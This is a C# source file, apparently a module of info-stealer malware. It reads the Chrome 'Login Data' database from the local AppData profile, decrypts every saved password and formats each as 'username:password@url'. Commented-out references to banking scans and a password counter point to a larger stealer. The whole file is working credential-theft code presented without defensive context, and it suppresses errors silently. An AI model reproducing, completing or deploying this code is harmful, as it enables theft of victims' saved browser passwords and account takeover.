using System;
using System.Collections.Generic;

namespace ChromeModule
{
    public struct Password
    {
        public string sUrl { get; set; }
        public string sUsername { get; set; }
        public string sPassword { get; set; }
    }

    public class ChromeModule
    {
        /// <summary>
        /// Get passwords from chromium based browsers
        /// </summary>
        /// <param name="sLoginData"></param>
        /// <returns>List with passwords</returns>
        public static List<Password> Get(string sLoginData)
        {
            List<Password> pPasswords = new List<Password>();
            try
            {
                // Read data from table
                SQLite sSQLite = SqlReader.ReadTable(sLoginData, "logins");
                if (sSQLite == null) return pPasswords;

                for (int i = 0; i < sSQLite.GetRowCount(); i++)
                {
                    Password pPassword = new Password();

                    pPassword.sUrl = Crypto.GetUTF8(sSQLite.GetValue(i, 0));
                    pPassword.sUsername = Crypto.GetUTF8(sSQLite.GetValue(i, 3));
                    string sPassword = sSQLite.GetValue(i, 5);

                    if (sPassword != null)
                    {
                        pPassword.sPassword = Crypto.GetUTF8(Crypto.EasyDecrypt(sLoginData, sPassword));
                        pPasswords.Add(pPassword);

                        // Analyze value
                        //Banking.ScanData(pPassword.sUrl);
                        //Counter.Passwords++;
                    }
                    continue;

                }

            }
            catch (System.Exception ex) {  }
            return pPasswords;
        }
        public static string Start()
        {
            string AppdataStr = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
            List<Password> pPasswords = Get($"{AppdataStr}\\Google\\Chrome\\User Data\\Default" + "\\Login Data");
            String PW = "\n";
            foreach (Password Pass in pPasswords)
            {
                PW += Pass.sUsername + ":" + Pass.sPassword + "@" + Pass.sUrl + "\n";
            }
            return PW;
        }
    }
}
